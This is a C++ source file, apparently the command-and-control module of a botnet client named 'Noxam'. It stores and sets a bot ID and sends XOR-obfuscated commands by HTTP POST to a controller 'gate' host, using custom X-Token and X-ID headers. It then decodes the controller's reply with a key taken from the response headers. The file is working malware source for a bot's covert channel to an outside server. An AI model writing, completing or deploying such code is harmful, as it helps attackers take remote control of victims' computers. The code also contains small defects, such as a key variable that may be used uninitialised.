#include <string>

#include "../Headers/Utils/NoxamGateHelper.hxx"
#include "../Headers/Utils/NoxamGate.hxx"
#include "../Headers/Crypto/NoxamWebSafeEncryption.hxx"
#include "../Headers/Net/NoxamHTTP.hxx"

using namespace std;

/*
|===========================================================
|    NoxamGetBotID()
|===========================================================
|
|
|===========================================================
*/
char *NoxamGetBotID()
{
    return NoxamBotID;
}

/*
|===========================================================
|    NoxamSendCommandWithDecodeResponse()
|===========================================================
|
|
|===========================================================
*/
char *NoxamSendCommandWithDecodeResponse(char *NxmCommand)
{
    char *NxmKey = NoxamXorGenerateKey(32), *NxmEncodedKey, *NxmEncodedResult, *NxmReturnedData, *NxmNewKey;
    int NxmDataLength, NxmOutputLength, NxmI;

    NxmEncodedResult = NoxamGetEncodedXorResult(NxmCommand, NxmKey, strlen(NxmCommand), 32, &NxmEncodedKey);
    NoxamXorFreeKey(NxmKey);

    NxmNameValuePair *NxmHeadersRkkHash[] = {
        new NxmNameValuePair("X-Token", NxmEncodedKey),
        new NxmNameValuePair("X-ID", NoxamBotID),
        0,
    };

    NxmNameValuePair *NxmPostDataRkkHash[] = {
        new NxmNameValuePair("X", NxmEncodedResult),
        0,
    };

    NxmNameValuePair *NxmReturnHeader;
    int NxmResult = NoxamHttQuery((char *)NOXAM_GATE_HOST, (char *)NOXAM_GATE_PATH, NxmHeadersRkkHash, &NxmReturnHeader, &NxmReturnedData, &NxmDataLength, true, "POST", NxmPostDataRkkHash);
    NoxamFreeEncodedXorResult(NxmEncodedResult, NxmEncodedKey);

    NxmNameValuePair **NxmHeaderPointer = NxmReturnHeader;
    while (NxmHeaderPointer != 0 && *NxmHeaderPointer != 0)
    {
        if (strcmp((*NxmHeaderPointer)->NxmName, "X-Token") == 0)
        {
            NxmNewKey = (*NxmHeaderPointer)->NxmValue;
            break;
        }
        NxmHeaderPointer++;
    }

    char *NxmOutput = NoxamGetDecodedXorResult(NxmReturnedData, NxmNewKey, &NxmOutputLength);
    char *NxmReturnBuffer = (char *)malloc(NxmOutputLength + 1);
    NxmReturnBuffer[NxmOutputLength] = 0;
    memcpy_s(NxmReturnBuffer, NxmOutputLength, NxmOutput, NxmOutputLength);
    NoxamFreeDecodedXorResult(NxmOutput);

    NxmI = 0;
    while (NxmHeadersRkkHash[NxmI] != 0)
    {
        delete (NxmHeadersRkkHash[NxmI]);
        NxmI++;
    }
    NoxamFreeHTTPResponse(NxmReturnHeader, NxmReturnedData);

    return NxmReturnBuffer;
}

/*
|===========================================================
|    NoxamSetBoldID()
|===========================================================
|
|
|===========================================================
*/
void NoxamSetBotID(char *NxmNewID)
{
    NoxamBotID = (char *)malloc(strlen(NxmNewID) + 1);
    NoxamBotID[strlen(NxmNewID)] = 0;
    memcpy_s(NoxamBotID, strlen(NxmNewID) + 1, NxmNewID, strlen(NxmNewID));
}

/*
|===========================================================
|    NoxamFreeDecodeResponse()
|===========================================================
|
|
|===========================================================
*/
void NoxamFreeDecodeResponse(char *NxmResponse)
{
    free(NxmResponse);
}